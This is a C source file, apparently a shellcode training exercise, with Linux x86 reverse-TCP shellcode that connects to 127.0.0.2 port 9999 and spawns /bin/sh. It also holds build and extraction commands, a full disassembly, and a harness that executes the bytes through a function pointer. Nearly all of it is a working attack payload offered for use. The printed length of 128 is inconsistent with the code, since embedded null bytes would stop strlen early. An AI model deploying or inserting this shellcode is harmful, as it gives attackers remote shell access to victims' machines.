#include <stdio.h>
#include <string.h>

/*
Get shellcode from disassembly dump:
$ echo `objdump -d shell_reverse_tcp  | grep -v file | grep '[0-9a-f]:' | cut  -f 2 ` | sed 's/ /\\x/g' | sed 's/^/\\x/g'
\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\x31\xc9\xb1\x01\x51\x31\xc9\xb1\x02\x51\x89\xe1\x31\xdb\xb3\x01\x6a\x66\x58\xcd\x80\x89\xc2\x68\x7f\x00\x00\x02\x66\x68\x27\x0f\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\x31\xdb\xb3\x03\x31\xc0\xb0\x66\xcd\x80\x6a\x02\x59\x89\xd3\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

Check instructions:
$ echo -ne "\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\x31\xc9\xb1\x01\x51\x31\xc9\xb1\x02\x51\x89\xe1\x31\xdb\xb3\x01\x6a\x66\x58\xcd\x80\x89\xc2\x68\x7f\x00\x00\x02\x66\x68\x27\x0f\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\x31\xdb\xb3\x03\x31\xc0\xb0\x66\xcd\x80\x6a\x02\x59\x89\xd3\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" | ndisasm -b 32 -
00000000  31C0              xor eax,eax
00000002  31DB              xor ebx,ebx
00000004  31C9              xor ecx,ecx
00000006  51                push ecx
00000007  B106              mov cl,0x6
00000009  51                push ecx
0000000A  31C9              xor ecx,ecx
0000000C  B101              mov cl,0x1
0000000E  51                push ecx
0000000F  31C9              xor ecx,ecx
00000011  B102              mov cl,0x2
00000013  51                push ecx
00000014  89E1              mov ecx,esp
00000016  31DB              xor ebx,ebx
00000018  B301              mov bl,0x1
0000001A  6A66              push byte +0x66
0000001C  58                pop eax
0000001D  CD80              int 0x80
0000001F  89C2              mov edx,eax
00000021  687F000002        push dword 0x200007f
00000026  6668270F          push word 0xf27
0000002A  666A02            push word 0x2
0000002D  89E1              mov ecx,esp
0000002F  6A10              push byte +0x10
00000031  51                push ecx
00000032  52                push edx
00000033  89E1              mov ecx,esp
00000035  31DB              xor ebx,ebx
00000037  B303              mov bl,0x3
00000039  31C0              xor eax,eax
0000003B  B066              mov al,0x66
0000003D  CD80              int 0x80
0000003F  6A02              push byte +0x2
00000041  59                pop ecx
00000042  89D3              mov ebx,edx
00000044  B03F              mov al,0x3f
00000046  CD80              int 0x80
00000048  49                dec ecx
00000049  79F9              jns 0x44
0000004B  31C0              xor eax,eax
0000004D  50                push eax
0000004E  682F2F7368        push dword 0x68732f2f
00000053  682F62696E        push dword 0x6e69622f
00000058  89E3              mov ebx,esp
0000005A  50                push eax
0000005B  89E2              mov edx,esp
0000005D  53                push ebx
0000005E  89E1              mov ecx,esp
00000060  B00B              mov al,0xb
00000062  CD80              int 0x80

Add to shellcode skeleton and compile:
$ gcc -o shellcode -z execstack shellcode.c

Test shellcode:
$ ./shellcode 
Shellcode Length:  128

*/

unsigned char code[] = \
    "\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\x31\xc9\xb1\x01\x51\x31\xc9\xb1\x02\x51\x89\xe1\x31\xdb\xb3\x01\x6a\x66\x58\xcd\x80\x89\xc2\x68\x7f\x00\x00\x02\x66\x68\x27\x0f\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\x31\xdb\xb3\x03\x31\xc0\xb0\x66\xcd\x80\x6a\x02\x59\x89\xd3\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// Function pointer
typedef int (*func_ptr)();

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	func_ptr ret = (func_ptr) code;

	ret();
}
